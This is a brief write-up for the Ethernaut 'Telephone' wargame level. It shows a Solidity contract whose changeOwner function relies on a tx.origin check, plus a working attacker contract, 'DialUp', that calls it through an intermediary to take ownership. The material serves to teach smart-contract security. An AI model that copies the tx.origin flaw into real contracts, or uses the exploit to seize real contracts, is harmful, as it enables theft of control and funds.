## Ethernaut Level 04 - Telephone - Write-Up
<!--Authors: OofedUp-->

Difficulty: 1/10

![image](https://i.imgur.com/5CnRjQc.png)

## Source
```javascript
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

We just need to call the `changeOwner()` function from a contract, since `tx.origin` does not detect the sender address if it is coming from a contract. We will use [Remix](https://remix.ethereum.org) where we can create the following contract:

```javascript
pragma solidity ^0.4.18;

contract Telephone {

  address public owner;

  function Telephone() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}

contract DialUp {
    Telephone main;

    function DialUp(){
        main = Telephone(INSTANCE ADDRESS);
    }
    function setOwner() public{
        //Player address
        main.changeOwner(PLAYER ADDRESS);
    }
}
```

We then change the owner to the player's address by calling `DialUp.setOwner()`. We can then submit the contract:

![image](https://i.imgur.com/be9wemr.png)
